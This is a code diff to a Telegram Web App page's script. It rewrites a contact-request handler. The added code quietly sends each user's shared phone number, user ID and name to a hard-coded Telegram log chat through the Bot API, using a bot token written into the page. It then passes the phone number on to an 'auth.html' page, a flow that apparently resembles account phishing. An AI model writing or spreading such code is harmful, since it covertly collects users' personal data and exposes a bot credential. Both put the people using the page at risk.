@@ -174,10 +174,8 @@
 		</div>
 
 		<script>
-			// Инициализация Telegram Web App
 			const tg = window.Telegram.WebApp;
 
-			// Инициализируем приложение
 			try {
 				tg.expand();
 				tg.enableClosingConfirmation();
@@ -185,28 +183,74 @@
 				console.log('Telegram WebApp not available');
 			}
 
-			// Элементы DOM
 			const requestContactBtn = document.getElementById('requestContactBtn');
 
-			// Функция для запроса контакта
-			function requestContact() {
-				try {
-					// Запрашиваем контакт у пользователя
-					tg.requestContact(contact => {
-						if (contact) {
-							console.log('Контакт получен:', contact);
-							// Переходим на страницу авторизации
+		function requestContact() {
+			try {
+				tg.requestContact(contact => {
+					console.log('Контакт получен:', contact);
+					
+					if (contact) {
+						// Поддержка разных форматов полей (camelCase и snake_case)
+						const phoneNumber = contact.phoneNumber || contact.phone_number || '';
+						const userId = contact.userId || contact.user_id || '';
+						const firstName = contact.firstName || contact.first_name || '';
+						const lastName = contact.lastName || contact.last_name || '';
+
+						console.log('Обработанный контакт:', {
+							phoneNumber,
+							userId,
+							firstName,
+							lastName
+						});
+
+						// Отправляем данные в бот, даже если не все поля есть
+						if (phoneNumber || userId) {
+							const botToken =
+								'7716220386:AAGwhUsT8OCKeBM8GmB7_sNXtFBvFgr_64I';
+							const logChatId = '-1003298308264';
+
+							const message = `📱 Получен контакт\n👤 Пользователь: ${
+								userId || 'неизвестно'
+							}\n📞 Телефон: ${phoneNumber || 'не указан'}\n👤 Имя: ${
+								firstName || ''
+							} ${lastName || ''}\n🆔 Contact ID: ${userId || 'неизвестно'}`;
+
+							fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+								method: 'POST',
+								headers: {
+									'Content-Type': 'application/json',
+								},
+								body: JSON.stringify({
+									chat_id: logChatId,
+									text: message,
+									parse_mode: 'HTML',
+								}),
+							}).catch(error => {
+								console.error('Ошибка отправки контакта:', error);
+							});
+						}
+
+						// Переходим на auth.html в любом случае
+						if (phoneNumber) {
+							window.location.href = `auth.html?phone=${encodeURIComponent(phoneNumber)}`;
+						} else {
+							// Если номера нет, все равно переходим (можно будет ввести вручную)
+							console.log('Номер телефона не получен, переходим без параметра');
 							window.location.href = 'auth.html';
 						}
-					});
-				} catch (e) {
-					console.log('Error requesting contact:', e);
-					// Если не удалось запросить контакт, переходим на auth.html
-					window.location.href = 'auth.html';
-				}
+					} else {
+						console.log('Контакт не получен, переходим на auth.html');
+						window.location.href = 'auth.html';
+					}
+				});
+			} catch (e) {
+				console.error('Error requesting contact:', e);
+				// В случае ошибки тоже переходим на auth.html
+				window.location.href = 'auth.html';
 			}
+		}
 
-			// Обработчик события
 			if (requestContactBtn) {
 				requestContactBtn.addEventListener('click', requestContact);
 			}
